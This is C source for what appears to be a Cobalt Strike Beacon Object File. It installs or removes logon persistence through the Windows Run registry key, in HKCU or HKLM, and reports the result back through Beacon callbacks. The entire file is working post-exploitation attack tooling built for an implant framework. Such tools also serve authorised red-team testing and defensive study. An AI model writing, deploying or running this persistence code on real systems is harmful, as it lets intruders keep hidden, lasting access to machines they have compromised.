/*
 * persist_registry.c — Add or remove Run key persistence
 *
 * Args: action  (string: "install" / "remove")
 *       key_name (string: registry value name)
 *       command  (string: executable path, required for "install")
 *       hkcu     (int: 1 = HKCU, 0 = HKLM)
 */

#include <windows.h>
#define BOF
#include "beacon.h"

/* DFR imports */
DFR(ADVAPI32, RegOpenKeyExA)
DFR(ADVAPI32, RegSetValueExA)
DFR(ADVAPI32, RegDeleteValueA)
DFR(ADVAPI32, RegCloseKey)
DFR(KERNEL32, GetLastError)

#define RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

void go(char* args, int len) {
    datap parser;
    int   action_sz = 0, name_sz = 0, cmd_sz = 0;
    char* action   = NULL;
    char* key_name = NULL;
    char* command  = NULL;
    int   use_hkcu = 1;
    HKEY  hive;
    HKEY  hKey = NULL;
    LONG  status;

    BeaconDataParse(&parser, args, len);
    action   = BeaconDataExtract(&parser, &action_sz);
    key_name = BeaconDataExtract(&parser, &name_sz);
    command  = BeaconDataExtract(&parser, &cmd_sz);
    use_hkcu = BeaconDataInt(&parser);

    if (action == NULL || action_sz <= 1) {
        BeaconPrintf(CALLBACK_ERROR, "Missing required argument: action");
        return;
    }

    if (key_name == NULL || name_sz <= 1) {
        BeaconPrintf(CALLBACK_ERROR, "Missing required argument: key_name");
        return;
    }

    /* Select registry hive */
    hive = use_hkcu ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;

    /* Open the Run key */
    status = ADVAPI32$RegOpenKeyExA(hive, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA failed: %ld (hive: %s)",
                     status, use_hkcu ? "HKCU" : "HKLM");
        return;
    }

    if (_stricmp(action, "install") == 0) {
        if (command == NULL || cmd_sz <= 1) {
            BeaconPrintf(CALLBACK_ERROR,
                         "Missing required argument: command (for install)");
            ADVAPI32$RegCloseKey(hKey);
            return;
        }

        /* cmd_sz includes null terminator from BeaconDataExtract */
        status = ADVAPI32$RegSetValueExA(hKey, key_name, 0, REG_SZ,
                                         (const BYTE*)command, cmd_sz);
        if (status != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA failed: %ld", status);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] Persistence installed: %s\\%s\n"
                         "    Value: %s = %s",
                         use_hkcu ? "HKCU" : "HKLM", RUN_KEY,
                         key_name, command);
        }

    } else if (_stricmp(action, "remove") == 0) {
        status = ADVAPI32$RegDeleteValueA(hKey, key_name);
        if (status != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "RegDeleteValueA failed: %ld", status);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] Persistence removed: %s\\%s\\%s",
                         use_hkcu ? "HKCU" : "HKLM", RUN_KEY, key_name);
        }

    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown action: %s (use install/remove)",
                     action);
    }

    /* Cleanup */
    ADVAPI32$RegCloseKey(hKey);
}
